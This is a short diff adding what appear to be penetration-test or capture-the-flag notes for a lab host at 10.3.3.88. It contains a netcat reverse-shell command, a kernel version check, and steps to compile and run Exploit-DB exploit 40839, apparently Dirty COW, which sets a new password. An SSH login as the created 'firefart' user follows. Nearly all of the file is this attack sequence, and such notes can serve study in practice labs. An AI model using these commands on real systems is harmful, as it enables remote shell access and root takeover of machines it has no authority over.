@@ -1,0 +1,15 @@
+http://10.3.3.88
+
+nc IP PORT -e /bin/bash
+
+uname -a 
+Linux luigi 2.6.31-14-generic - https://www.exploit-db.com/exploits/40839
+
+gcc -pthread 40839.c -o 40839 -lcrypt 
+chmod +x 40839
+./40839
+
+Please enter the new password: qwerty
+
+ssh firefart@10.3.3.88 
+pass: qwerty
